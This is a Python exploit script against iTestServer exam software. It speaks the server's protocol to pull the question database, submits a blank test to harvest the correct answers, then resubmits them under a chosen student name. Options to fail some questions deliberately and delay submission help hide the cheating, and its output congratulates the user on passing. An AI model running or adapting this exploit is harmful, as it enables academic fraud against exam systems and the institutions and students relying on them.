#!/usr/bin/python3

import socket
import time
import re
import argparse


def ParseArguments():
	global args
	parser = argparse.ArgumentParser(description='Score a 10 in any iTestServer Exam. by isHaacK',
	epilog='Example of use iTestServer_PassExam.py 127.0.0.1 2000 "Your Name" --fail 2',add_help=False)
	parser.add_argument('ip', type=str, help='The ip of the server')
	parser.add_argument('port', type=int, help='The listening port of the server')
	parser.add_argument('name', type=str, help='The student name shown on the server')
	parser.add_argument('-f','--fail', type=int, default=0, help='Number of questions to purposely fail (Default 0)')
	parser.add_argument('-d','--delay', type=int, default=10, help='Delay in seconds to submit the exam (Default 10s)')
	parser.add_argument(
		'--help','-h',
		action='help',
		default=argparse.SUPPRESS,
		help=argparse._('show this help message and exit'))
	args = parser.parse_args()


def Clean(data):
	data = data.decode("windows-1252",errors="replace")
	data = re.sub(r"\0\0\0.","",data)
	data = re.sub(r"\0","",data)
	return data


def ParseDict(data):
	# Parse data to dictionary
	# filter since same regex is used for both.

	if "Q_" in data:
		data += "[Q_" # 
		key =   re.compile(r'.*?\[(Q_.*)\].*')
		value = re.compile(r'(?<=\])\n*(.*?)(?=\[Q_)', re.DOTALL)

	else:
		key =   re.compile(r'.*?\[(.*)\].*')
		value = re.compile(r'(?<=\])\n*(.*?)(?=\[)', re.DOTALL)

	keys = re.findall(key, data)
	values = re.findall(value, data)

	return {keys[i]:value.strip() for i,value in enumerate(values)}

def GetBanner(s):	
	banner = s.recv(40000000)
	banner = ParseDict(Clean(banner))
	print(f"    iTest Version {banner['ITEST_VERSION']}")
	print(f"    DB Name {banner['DB_NAME']}")
	return banner


def Connect(ip,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((ip, port))
		print("    Connected to the server")
		return s
	except:
		print("[-] Could not connect to the server")
		exit(0)

def ToByte(n):
	return str(hex(n))[2:].zfill(2)

def ReqQuestions(s, qnum):
	Questions = {}
	i = 1
	svgs = 0
	while i < qnum+1: 
		nhex = ToByte(i)
		req = bytearray.fromhex(f"00000000000000{nhex}")
		s.send(req)

		r = s.recv(400000)
		Q = ParseDict(Clean(r))
		i += 1
		
		if "Q_SVG" in Q:
			Questions[Q["Q_NAME"]] = Q
			if Q["Q_SVG"] == "1":
				qnum += 1
				svgs += 1

			continue
	print(f"    Retrieved {qnum-svgs} Questions and {svgs} images")
	return Questions


def AddNull(data):
	return ''.join([f"00{ToByte(ord(l))}" for l in data])


def SendName(s,name):
	lenbyte = ToByte(len(name)*2)
	namebytes = AddNull(name)
	second = f"000000{lenbyte}{namebytes}"
	first = f"00000000000000{ToByte(len(second)//2)}"
	payload = bytearray.fromhex(first+second)
	print(f"    Name sent '{name}'")
	s.send(payload)

def Len(data):
	length = len(data)
	return "000000"+ToByte(length*2)


def Send(s, Questions, qnum, Answers = None, fail = 0):
	lentotal = ""
	Q_NAME = "00000012005b0051005f004e0041004d0045005d000a"
	Q_ANSWERED = "0000001c000a005b0051005f0041004e005300570045005200450044005d000a"
	data = ""
	packet = ""
	for i, q in enumerate(Questions):

		if i == int(qnum):
			break

		data += Q_NAME
		data += Len(q)
		data += AddNull(q)
		data += Q_ANSWERED
		time.sleep(0.05)
		if Answers != None and (i + fail) < int(qnum):
			data += Len(f"{Answers[q]}\n")
			data += AddNull(f"{Answers[q]}\n")
			print(f"    Payload {i+1}/{len(Questions)} with correct answer {Answers[q]} Done")
			continue

		elif Answers != None:
			print(f"    Payload {i+1}/{len(Questions)} with incorrect answer Done!")
		
		data += Len("0\n")
		data += AddNull("0\n")
		

	packet += str(hex(len(data)//2))[2:].zfill(16)
	packet += data
	payload = bytearray.fromhex(packet)
	s.send(payload)
	


def GetAnswers(s):
	data = s.recv(40000)
	data = Clean(data)

	Q_NAME = re.compile(r'\[Q_NAME\]\n*(.*?)(?=\[Q_)', re.DOTALL)
	Q_C_ANS = re.compile(r'\[Q_C_ANS\]\n*(.*?)(?=\[Q_)', re.DOTALL)

	questions = re.findall(Q_NAME, data)
	answers = re.findall(Q_C_ANS, data)
	print(f"    Retrieved {len(answers)}/{len(questions)} correct answers")
	return {questions[i].strip():answer.strip() for i,answer in enumerate(answers)}


def GetQuestions(s):
	Banner = GetBanner(s)
	db_qnum = Banner["DB_QNUM"]
	test_qnum = Banner["TEST_QNUM"]
	time.sleep(0.2)
	return ReqQuestions(s, int(db_qnum)), db_qnum, test_qnum 


def Main(ip, port, name, tofail, delay):
	print("[+] Stage 1")
	s = Connect(ip, port)
	Questions, db_qnum, test_qnum = GetQuestions(s)
	time.sleep(0.2)
	SendName(s, "")

	Send(s, Questions, test_qnum)
	Answers = GetAnswers(s)

	time.sleep(0.2)
	print("\n[+] Stage 2")
	s = Connect(ip, port)
	GetQuestions(s)
	time.sleep(0.2)
	SendName(s, name)
	print(f"\n[-] Waiting {delay} seconds to submit")
	time.sleep(delay)
	print("\n[+] Stage 3")
	time.sleep(1)
	print("    Crafting exam payload...")
	Send(s, Questions, test_qnum, Answers, tofail)
	print("\n[+] Exploit Complete, Enjoy Passing your exam!")
	print("[*] by isHaacK")


if __name__ == '__main__':
	ParseArguments()
	print(f"[*] Exploit will wait {args.delay} seconds and fail {args.fail} questions")
	time.sleep(0.2)
	Main(args.ip, args.port, args.name, args.fail, args.delay)
